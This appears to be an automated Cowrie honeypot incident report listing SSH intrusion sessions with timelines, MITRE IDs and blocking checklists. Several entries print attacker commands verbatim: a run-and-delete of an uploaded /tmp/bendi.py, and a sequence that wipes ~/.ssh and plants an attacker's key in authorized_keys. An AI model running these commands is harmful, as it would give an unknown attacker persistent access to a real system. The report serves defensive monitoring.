| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-01 17:03 |
| **Last Seen** | 2026-07-01 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:03:52` | `cowrie.session.connect` |
| `2026-07-01 17:03:52` | `cowrie.client.version` |
| `2026-07-01 17:03:52` | `cowrie.client.kex` |
| `2026-07-01 17:03:53` | `cowrie.login.success` |
| `2026-07-01 17:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b670b6d30046

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-01 17:03 |
| **Last Seen** | 2026-07-01 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:03:55` | `cowrie.session.connect` |
| `2026-07-01 17:03:55` | `cowrie.client.version` |
| `2026-07-01 17:03:55` | `cowrie.client.kex` |
| `2026-07-01 17:03:55` | `cowrie.login.success` |
| `2026-07-01 17:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a2c84f591b7

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-01 17:04 |
| **Last Seen** | 2026-07-01 17:06 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:04:14` | `cowrie.session.connect` |
| `2026-07-01 17:04:14` | `cowrie.client.version` |
| `2026-07-01 17:04:14` | `cowrie.client.kex` |
| `2026-07-01 17:04:15` | `cowrie.login.success` |
| `2026-07-01 17:04:16` | `cowrie.session.file_upload` |
| `2026-07-01 17:04:16` | `cowrie.session.params` |
| `2026-07-01 17:04:16` | `cowrie.command.input` |
| `2026-07-01 17:04:16` | `cowrie.command.input` |
| `2026-07-01 17:04:16` | `cowrie.command.input` |
| `2026-07-01 17:04:16` | `cowrie.command.failed` |
| `2026-07-01 17:04:16` | `cowrie.log.closed` |
| `2026-07-01 17:04:17` | `cowrie.session.params` |
| `2026-07-01 17:04:17` | `cowrie.command.input` |
| `2026-07-01 17:04:17` | `cowrie.log.closed` |
| `2026-07-01 17:04:18` | `cowrie.session.params` |
| `2026-07-01 17:04:18` | `cowrie.command.input` |
| `2026-07-01 17:04:18` | `cowrie.log.closed` |
| `2026-07-01 17:04:19` | `cowrie.session.params` |
| `2026-07-01 17:04:19` | `cowrie.command.input` |
| `2026-07-01 17:04:19` | `cowrie.command.failed` |
| `2026-07-01 17:04:19` | `cowrie.command.failed` |
| `2026-07-01 17:05:20` | `cowrie.session.params` |
| `2026-07-01 17:05:20` | `cowrie.command.input` |
| `2026-07-01 17:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c27572e3109

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:05 |
| **Last Seen** | 2026-07-01 17:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:05:36` | `cowrie.session.connect` |
| `2026-07-01 17:05:36` | `cowrie.client.version` |
| `2026-07-01 17:05:37` | `cowrie.client.kex` |
| `2026-07-01 17:05:38` | `cowrie.login.success` |
| `2026-07-01 17:05:39` | `cowrie.session.params` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.success` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.command.input` |
| `2026-07-01 17:05:39` | `cowrie.log.closed` |
| `2026-07-01 17:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e8501dce1a

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-01 17:06 |
| **Last Seen** | 2026-07-01 17:08 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:06:35` | `cowrie.session.connect` |
| `2026-07-01 17:06:35` | `cowrie.client.version` |
| `2026-07-01 17:06:35` | `cowrie.client.kex` |
| `2026-07-01 17:06:36` | `cowrie.login.success` |
| `2026-07-01 17:06:37` | `cowrie.session.file_upload` |
| `2026-07-01 17:06:37` | `cowrie.session.params` |
| `2026-07-01 17:06:37` | `cowrie.command.input` |
| `2026-07-01 17:06:37` | `cowrie.command.input` |
| `2026-07-01 17:06:37` | `cowrie.command.input` |
| `2026-07-01 17:06:37` | `cowrie.command.failed` |
| `2026-07-01 17:06:37` | `cowrie.log.closed` |
| `2026-07-01 17:06:38` | `cowrie.session.params` |
| `2026-07-01 17:06:38` | `cowrie.command.input` |
| `2026-07-01 17:06:38` | `cowrie.log.closed` |
| `2026-07-01 17:06:39` | `cowrie.session.params` |
| `2026-07-01 17:06:39` | `cowrie.command.input` |
| `2026-07-01 17:06:39` | `cowrie.log.closed` |
| `2026-07-01 17:06:40` | `cowrie.session.params` |
| `2026-07-01 17:06:40` | `cowrie.command.input` |
| `2026-07-01 17:06:40` | `cowrie.command.failed` |
| `2026-07-01 17:06:40` | `cowrie.command.failed` |
| `2026-07-01 17:07:41` | `cowrie.session.params` |
| `2026-07-01 17:07:41` | `cowrie.command.input` |
| `2026-07-01 17:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63b9be229d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:07 |
| **Last Seen** | 2026-07-01 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:07:43` | `cowrie.session.connect` |
| `2026-07-01 17:07:43` | `cowrie.client.version` |
| `2026-07-01 17:07:43` | `cowrie.client.kex` |
| `2026-07-01 17:07:44` | `cowrie.login.success` |
| `2026-07-01 17:07:44` | `cowrie.session.params` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.success` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.command.input` |
| `2026-07-01 17:07:44` | `cowrie.log.closed` |
| `2026-07-01 17:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdfc0fbedb67

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 17:07 |
| **Last Seen** | 2026-07-01 17:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:07:48` | `cowrie.session.connect` |
| `2026-07-01 17:07:49` | `cowrie.client.version` |
| `2026-07-01 17:07:49` | `cowrie.client.kex` |
| `2026-07-01 17:07:55` | `cowrie.login.success` |
| `2026-07-01 17:07:59` | `cowrie.session.params` |
| `2026-07-01 17:07:59` | `cowrie.command.input` |
| `2026-07-01 17:08:01` | `cowrie.log.closed` |
| `2026-07-01 17:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a78b65177f2c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:08 |
| **Last Seen** | 2026-07-01 17:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:08:04` | `cowrie.session.connect` |
| `2026-07-01 17:08:04` | `cowrie.client.version` |
| `2026-07-01 17:08:04` | `cowrie.client.kex` |
| `2026-07-01 17:08:05` | `cowrie.login.success` |
| `2026-07-01 17:08:06` | `cowrie.session.params` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.success` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.command.input` |
| `2026-07-01 17:08:06` | `cowrie.log.closed` |
| `2026-07-01 17:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3061edc0335

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:10 |
| **Last Seen** | 2026-07-01 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:10:42` | `cowrie.session.connect` |
| `2026-07-01 17:10:42` | `cowrie.client.version` |
| `2026-07-01 17:10:42` | `cowrie.client.kex` |
| `2026-07-01 17:10:42` | `cowrie.login.success` |
| `2026-07-01 17:10:43` | `cowrie.session.params` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.success` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:43` | `cowrie.command.input` |
| `2026-07-01 17:10:44` | `cowrie.log.closed` |
| `2026-07-01 17:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-070d103a1a11

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]243` |
| **First Seen** | 2026-07-01 17:11 |
| **Last Seen** | 2026-07-01 17:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:11:37` | `cowrie.session.connect` |
| `2026-07-01 17:11:37` | `cowrie.client.version` |
| `2026-07-01 17:11:38` | `cowrie.client.kex` |
| `2026-07-01 17:11:38` | `cowrie.login.success` |
| `2026-07-01 17:11:40` | `cowrie.session.params` |
| `2026-07-01 17:11:40` | `cowrie.command.input` |
| `2026-07-01 17:11:40` | `cowrie.command.failed` |
| `2026-07-01 17:11:40` | `cowrie.log.closed` |
| `2026-07-01 17:11:41` | `cowrie.session.params` |
| `2026-07-01 17:11:41` | `cowrie.command.input` |
| `2026-07-01 17:11:41` | `cowrie.session.file_download` |
| `2026-07-01 17:11:41` | `cowrie.log.closed` |
| `2026-07-01 17:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]243` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8804f628eb33

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]243` |
| **First Seen** | 2026-07-01 17:11 |
| **Last Seen** | 2026-07-01 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:11:42` | `cowrie.session.connect` |
| `2026-07-01 17:11:42` | `cowrie.client.version` |
| `2026-07-01 17:11:42` | `cowrie.client.kex` |
| `2026-07-01 17:11:43` | `cowrie.login.success` |
| `2026-07-01 17:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]243` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3902798b355

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]243` |
| **First Seen** | 2026-07-01 17:11 |
| **Last Seen** | 2026-07-01 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:11:43` | `cowrie.session.connect` |
| `2026-07-01 17:11:43` | `cowrie.client.version` |
| `2026-07-01 17:11:44` | `cowrie.client.kex` |
| `2026-07-01 17:11:45` | `cowrie.login.success` |
| `2026-07-01 17:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]243` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fcfe9a54bf4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:12 |
| **Last Seen** | 2026-07-01 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:12:41` | `cowrie.session.connect` |
| `2026-07-01 17:12:41` | `cowrie.client.version` |
| `2026-07-01 17:12:41` | `cowrie.client.kex` |
| `2026-07-01 17:12:41` | `cowrie.login.success` |
| `2026-07-01 17:12:42` | `cowrie.session.params` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.success` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.command.input` |
| `2026-07-01 17:12:42` | `cowrie.log.closed` |
| `2026-07-01 17:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed71197327de

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:13 |
| **Last Seen** | 2026-07-01 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:13:34` | `cowrie.session.connect` |
| `2026-07-01 17:13:34` | `cowrie.client.version` |
| `2026-07-01 17:13:34` | `cowrie.client.kex` |
| `2026-07-01 17:13:35` | `cowrie.login.success` |
| `2026-07-01 17:13:36` | `cowrie.session.params` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.success` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.command.input` |
| `2026-07-01 17:13:36` | `cowrie.log.closed` |
| `2026-07-01 17:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9509bbe46d7b

| Field | Detail |
|---|---|
| **Source IP** | `49.43.241[.]11` |
| **First Seen** | 2026-07-01 17:14 |
| **Last Seen** | 2026-07-01 17:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:14:20` | `cowrie.session.connect` |
| `2026-07-01 17:14:20` | `cowrie.client.version` |
| `2026-07-01 17:14:21` | `cowrie.client.kex` |
| `2026-07-01 17:14:22` | `cowrie.login.success` |
| `2026-07-01 17:14:23` | `cowrie.session.params` |
| `2026-07-01 17:14:23` | `cowrie.command.input` |
| `2026-07-01 17:14:23` | `cowrie.command.failed` |
| `2026-07-01 17:14:23` | `cowrie.log.closed` |
| `2026-07-01 17:14:24` | `cowrie.session.params` |
| `2026-07-01 17:14:24` | `cowrie.command.input` |
| `2026-07-01 17:14:25` | `cowrie.session.file_download` |
| `2026-07-01 17:14:25` | `cowrie.log.closed` |
| `2026-07-01 17:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.43.241[.]11` to AbuseIPDB if not already reported
- [ ] Block `49.43.241[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a7921eac3e

| Field | Detail |
|---|---|
| **Source IP** | `49.43.241[.]11` |
| **First Seen** | 2026-07-01 17:14 |
| **Last Seen** | 2026-07-01 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:14:25` | `cowrie.session.connect` |
| `2026-07-01 17:14:25` | `cowrie.client.version` |
| `2026-07-01 17:14:25` | `cowrie.client.kex` |
| `2026-07-01 17:14:26` | `cowrie.login.success` |
| `2026-07-01 17:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
